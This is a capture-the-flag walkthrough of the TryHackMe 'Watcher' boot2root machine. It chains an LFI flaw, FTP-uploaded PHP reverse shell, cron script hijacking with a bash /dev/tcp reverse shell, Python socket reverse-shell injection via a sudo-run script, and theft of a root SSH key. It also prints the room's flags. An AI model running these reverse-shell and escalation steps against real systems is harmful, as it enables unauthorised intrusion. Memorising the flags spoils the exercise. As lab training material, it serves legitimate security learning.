# Watcher: TryHackMe Walkthrough

**Room Link:** [Watcher](https://tryhackme.com/room/watcher)  
**Description:** A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.

---

## Initial Enumeration

We start by running an Nmap scan to discover open ports and services:

```bash
nmap -sC -sV $IP
```

**Results:**
```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

We see three open ports: FTP (21), SSH (22), and HTTP (80).

## Web Enumeration

Checking out the web server on port 80, we find a `robots.txt` file:

`/robots.txt`
```text
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

Retrieving `/flag_1.txt` gives us our first flag:
`FLAG{robots_dot_text_what_is_next}`

### Local File Inclusion (LFI)

Exploring the website further, clicking on a post redirects us to `http://$IP/post.php?post=striped.php`. This `post` parameter is vulnerable to Local File Inclusion (LFI). 

We can replace `striped.php` with the other file we found in `robots.txt`:

`/post.php?post=secret_file_do_not_read.txt`
```text
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777
```

We now have valid FTP credentials: `ftpuser:givemefiles777`.

## Gaining Initial Access (www-data)

With the credentials, let's log into the FTP server:

```bash
ftp $IP
# Username: ftpuser
# Password: givemefiles777
```

Checking the FTP directory, we find `flag_2.txt`:
```bash
ftp> ls
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt

ftp> more flag_2.txt
FLAG{ftp_you_and_me}
```

We get the second flag.

The `/files` directory is mapped to `/home/ftpuser/ftp/files`, which we can also assume is accessible and executable from the LFI vulnerability. We will upload a PHP reverse shell here.

1. Prepare your PHP reverse shell:
```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php 
# Edit shell.php with your TryHackMe VPN IP and chosen port (e.g., 1234)
```

2. Start a netcat listener:
```bash
nc -lnvp 1234
```

3. Upload the shell via FTP:
```bash
ftp> cd files
ftp> put shell.php
```

Now, we execute the shell through our LFI vulnerability in the browser:
`http://<target_ip>/post.php?post=/home/ftpuser/ftp/files/shell.php`

We successfully get a shell as `www-data`!

Checking around the web directory (`/var/www/html/`), we find another hidden directory:

```bash
$ cd /var/www/html
$ cd more_secrets_a9f10a
$ cat flag_3.txt
FLAG{lfi_what_a_guy}
```

Flag 3 obtained!

## Privilege Escalation: www-data -> toby

Checking the `/home` directories, we find several users: `ftpuser`, `mat`, `toby`, `ubuntu`, `will`.

Inside `/home/mat/note.txt`:
```text
Hi Mat,
I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.
Will
```

Inside `/home/toby/note.txt`:
```text
Hi Toby,
I've got the cron jobs set up now so don't worry about getting that done.
Mat
```

Checking `www-data`'s sudo permissions with `sudo -l`:
```bash
$ sudo -l
User www-data may run the following commands on ip-10-201-25-197:
    (toby) NOPASSWD: ALL
```

We can run any command as `toby` without a password! Let's read `flag_4.txt` in Toby's home directory.

```bash
$ sudo -u toby cat /home/toby/flag_4.txt
FLAG{chad_lifestyle}
```

Flag 4 obtained!

## Privilege Escalation: toby -> mat

We know getting to Mat involves cron jobs. Let's look at `cow.sh` in Toby's jobs directory:

```bash
$ cat /home/toby/jobs/cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```

This script is owned by Mat but is world-writable (or writable by Toby) and appears to be executed periodically by Mat via a cron job. We can append a reverse shell payload to `cow.sh`.

```bash
$ echo 'bash -i >& /dev/tcp/<your_ip_address>/4444 0>&1' >> /home/toby/jobs/cow.sh
```

Start another netcat listener (`nc -lnvp 4444`) and wait a minute. We get a connection as `mat`.

Let's read flag 5:
```bash
mat@ip-10-201-25-197:~$ cat flag_5.txt
FLAG{live_by_the_cow_die_by_the_cow}
```

Flag 5 obtained!

## Privilege Escalation: mat -> will

Now we are Mat, returning to the script mentioned in the notes. We check `mat`'s sudo permissions:

```bash
mat@ip-10-201-25-197:~/scripts$ sudo -l
User mat may run the following commands on ip-10-201-25-197:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

Mat can run `will_script.py` as Will. Let's inspect the scripts folder.

`/home/mat/scripts/will_script.py`:
```python
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```

`/home/mat/scripts/cmd.py`:
```python
def get_command(num):
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
```

Because `cmd.py` is in the same directory and is owned by `mat`, we can simply overwrite it and inject a python reverse shell. 

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip_address>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > cmd.py
```

Set up our netcat listener again (`nc -lnvp 1234`) and execute the script via sudo:
```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```

Our listener catches the shell. We are now `will`.

```bash
$ whoami
will
$ cat /home/will/flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
```

Flag 6 obtained!

## Privilege Escalation: will -> root

Let's check what groups our current user `will` belongs to using the `id` command:

```bash
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
```

Will is part of the `adm` group. Let's search for files owned by this group:

```bash
find / -type f -group adm 2>>/dev/null
```

Among the results is `/opt/backups/key.b64`.

Reading `key.b64`, we realize it is an SSH RSA private key encoded in base64. 

Let's copy the base64 string, decode it on our host machine, and save it to a file `id_rsa`.

```bash
# Don't forget to set correct permissions for SSH Key
chmod 600 id_rsa
ssh -i id_rsa root@$IP
```

We now have a root shell over SSH. Let's grab the final flag:

```bash
root@Watcher:~# cat /root/flag_7.txt
FLAG{who_watches_the_watchers}
```

